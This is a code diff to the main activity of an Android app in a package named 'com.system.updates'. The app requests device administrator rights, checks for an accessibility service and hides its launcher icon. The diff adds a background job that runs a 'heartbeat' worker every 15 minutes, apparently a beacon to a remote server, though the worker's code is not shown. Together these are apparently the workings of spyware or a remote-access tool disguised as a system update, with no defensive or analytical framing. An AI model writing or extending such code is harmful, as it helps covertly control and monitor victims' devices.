@@ -8,13 +8,19 @@ import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.provider.Settings;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
 import com.system.updates.core.AdminReceiver;
+import com.system.updates.network.HeartbeatWorker;
+import java.util.concurrent.TimeUnit;
 
 public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        scheduleHeartbeat();
 
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
@@ -32,6 +38,14 @@ public class MainActivity extends AppCompatActivity {
         } else {
             hideAppIcon();
         }
+    }
+
+    private void scheduleHeartbeat() {
+        PeriodicWorkRequest heartbeatRequest =
+            new PeriodicWorkRequest.Builder(HeartbeatWorker.class, 15, TimeUnit.MINUTES)
+                .build();
+
+        WorkManager.getInstance(this).enqueue(heartbeatRequest);
     }
 
     private boolean isAccessibilityServiceEnabled() {
